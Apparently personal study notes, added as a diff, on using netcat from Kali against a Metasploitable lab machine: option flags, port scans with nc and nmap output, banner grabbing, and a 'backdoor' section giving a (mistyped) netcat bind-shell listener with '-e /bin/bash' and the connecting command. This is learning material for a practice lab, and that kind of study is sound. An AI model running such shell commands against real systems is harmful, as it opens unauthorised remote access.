@@ -1,0 +1,220 @@
+Ncat-
+-l :  listen
+-v : Vervosity - in the case of connection refuse or time out details not 
+appearing but through -v : Vervosity all will detail appears. 
+-p : port 
+-w : timeout : set time in port scaning then change another
+-n : don't resolve execute cmd if the ip you have 
+-z : port scan 
+
+------------------------------
+┌──(kali㉿kali)-[~]
+└─$
+nc -zvw 1 192.168.176.128 1-100 
+192.168.176.128: inverse host lookup failed: Host name lookup failure
+(UNKNOWN) [192.168.176.128] 80 (http) open
+(UNKNOWN) [192.168.176.128] 53 (domain) open
+(UNKNOWN) [192.168.176.128] 25 (smtp) open
+(UNKNOWN) [192.168.176.128] 23 (telnet) open
+(UNKNOWN) [192.168.176.128] 22 (ssh) open
+(UNKNOWN) [192.168.176.128] 21 (ftp) open
+===============================================
+---------------------
+┌──(kali㉿kali)-[~]
+└─$ nc -zvnw 1 192.168.176.128 1-100 
+(UNKNOWN) [192.168.176.128] 100 (?) : Connection timed out
+(UNKNOWN) [192.168.176.128] 99 (?) : Connection timed out
+(UNKNOWN) [192.168.176.128] 98 (?) : Connection timed out
+(UNKNOWN) [192.168.176.128] 97 (?) : No route to host
+(UNKNOWN) [192.168.176.128] 96 (?) : Connection timed out
+(UNKNOWN) [192.168.176.128] 95 (?) : Connection timed out
+(UNKNOWN) [192.168.176.128] 80 (http) open
+(UNKNOWN) [192.168.176.128] 53 (domain) open
+(UNKNOWN) [192.168.176.128] 25 (smtp) open
+(UNKNOWN) [192.168.176.128] 23 (telnet) open
+(UNKNOWN) [192.168.176.128] 22 (ssh) open
+(UNKNOWN) [192.168.176.128] 21 (ftp) open
+
+-------------------------------------------------
+ =====================================
+What is Banner Grabbing? Tools and Techniques Explained-
+Netcat, also known as 'nc', is a tool used on Unix/Linux systems
+to perform banner grabbing by analyzing server responses. 
+The Netcat command for banner grabbing often includes 
+the options -vv for verbose outputs, -n to avoid 
+DNS resolution, and -w1 for a one-second timeout.
+====================================================
+echo "" send blank string - then server response somthing -
+------------------------
+echo "" | nc -vn 192.168.176.128 80
+
+┌──(kali㉿kali)-[~]
+└─$ echo "" | nc -vn 192.168.176.128 80
+
+(UNKNOWN) [192.168.176.128] 80 (http) open                                                      
+^Z
+zsh: done       echo "" | 
+zsh: suspended  nc -vn 192.168.176.128 80
+------------------------------------------------
+┌──(kali㉿kali)-[~]
+└─$ echo "" | nc -vn 192.168.176.128 22
+(UNKNOWN) [192.168.176.128] 22 (ssh) open
+SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
+Protocol mismatch.
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ echo "" | nc -vn 192.168.176.128 25
+(UNKNOWN) [192.168.176.128] 25 (smtp) open
+220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
+500 5.5.2 Error: bad syntax
+        ^Z
+zsh: done       echo "" | 
+zsh: suspended  nc -vn 192.168.176.128 25
+------------------------------------------
+sometime don't work but mostly it works
+-------------------------------------------
+===========================================
+backdoor -------------needs two facters 
+ 
+1. listener- listen on specific port so wait any request on specific
+port for make connection as such any send request it establish the connection.
+nc lvp 4444 -e /bin/besh
+2.initiator - initiator send request to listener for connect 
+and listener waiting for connect request so geting connection request.
+listener connected. 
+nc -v 192.168.176.128 4444
+---------------------------------------
+(reverse shell) l---> initator and initator ---> listener (blind shell)
+---------------------------------------
+
+└─$ nmap -Pn 192.168.176.128        
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-21 00:54 EDT
+Nmap scan report for 192.168.176.128
+Host is up (0.0013s latency).
+Not shown: 977 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+23/tcp   open  telnet
+25/tcp   open  smtp
+53/tcp   open  domain
+80/tcp   open  http
+111/tcp  open  rpcbind
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+512/tcp  open  exec
+513/tcp  open  login
+514/tcp  open  shell
+1099/tcp open  rmiregistry
+1524/tcp open  ingreslock
+2049/tcp open  nfs
+2121/tcp open  ccproxy-ftp
+3306/tcp open  mysql
+5432/tcp open  postgresql
+5900/tcp open  vnc
+6000/tcp open  X11
+6667/tcp open  irc
+8009/tcp open  ajp13
+8180/tcp open  unknown
+
+-------------------------------------------
+┌──(kali㉿kali)-[~]
+└─$ nc -zvnw 1 192.168.176.128 1-65535
+(UNKNOWN) [192.168.176.128] 55974 (?) open
+(UNKNOWN) [192.168.176.128] 47388 (?) open
+(UNKNOWN) [192.168.176.128] 45298 (?) open
+(UNKNOWN) [192.168.176.128] 35726 (?) open
+(UNKNOWN) [192.168.176.128] 8787 (?) open
+(UNKNOWN) [192.168.176.128] 8180 (?) open
+(UNKNOWN) [192.168.176.128] 8009 (?) open
+(UNKNOWN) [192.168.176.128] 6697 (ircs-u) open
+(UNKNOWN) [192.168.176.128] 6667 (ircd) open
+(UNKNOWN) [192.168.176.128] 6000 (x11) open
+(UNKNOWN) [192.168.176.128] 5900 (?) open
+(UNKNOWN) [192.168.176.128] 5432 (postgresql) open
+(UNKNOWN) [192.168.176.128] 3632 (distcc) open
+(UNKNOWN) [192.168.176.128] 3306 (mysql) open
+(UNKNOWN) [192.168.176.128] 2121 (iprop) open
+(UNKNOWN) [192.168.176.128] 2049 (nfs) open
+(UNKNOWN) [192.168.176.128] 1524 (ingreslock) open
+(UNKNOWN) [192.168.176.128] 1099 (rmiregistry) open
+(UNKNOWN) [192.168.176.128] 514 (shell) open
+(UNKNOWN) [192.168.176.128] 513 (login) open
+(UNKNOWN) [192.168.176.128] 512 (exec) open
+(UNKNOWN) [192.168.176.128] 445 (microsoft-ds) open
+(UNKNOWN) [192.168.176.128] 139 (netbios-ssn) open
+(UNKNOWN) [192.168.176.128] 111 (sunrpc) open
+(UNKNOWN) [192.168.176.128] 80 (http) open
+(UNKNOWN) [192.168.176.128] 53 (domain) open
+(UNKNOWN) [192.168.176.128] 25 (smtp) open
+(UNKNOWN) [192.168.176.128] 23 (telnet) open
+(UNKNOWN) [192.168.176.128] 22 (ssh) open
+(UNKNOWN) [192.168.176.128] 21 (ftp) open
+----------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+reference - 
+What is NetCat? How NetCat Works? Share Files Through NetCat | BackDoor
